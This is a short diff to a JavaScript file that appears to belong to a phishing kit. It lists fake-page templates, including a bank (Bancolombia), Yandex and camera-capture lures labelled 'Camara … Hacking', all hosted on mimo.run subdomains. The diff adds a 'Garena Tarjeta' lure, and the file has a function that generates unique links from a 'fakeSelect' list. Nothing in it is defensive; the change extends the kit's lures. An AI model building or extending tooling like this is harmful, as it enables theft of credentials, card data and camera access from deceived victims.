@@ -304,7 +304,8 @@ const plantillas = [
   { nombre: "Bancolombia", url: "https://mtfj1s.mimo.run/index.html" },
   { nombre: "Camara Zoom Clases Hacking", url: "https://mduzum.mimo.run/index.html" },
   { nombre: "Camara xXx Hacking", url: "https://d47vgr.mimo.run/index.html" },
-  { nombre: "Yandex", url: "https://8dn47v.mimo.run/index.html" }
+  { nombre: "Yandex", url: "https://8dn47v.mimo.run/index.html" },  
+  { nombre: "Garena Tarjeta", url: "https://5mpser.mimo.run/index.html" }
 ];
 function generarEnlacesUnicos() {
   const fake = $id("fakeSelect");
@@ -1153,4 +1154,5 @@ document.querySelectorAll('.btn,#menuBtn,#chatSend,#fakeSelect,#chatPanel,#chatM
     setInterval(actualizarUsuarios, 2000);
     actualizarUsuarios();
   }, 2000);
+
 })();
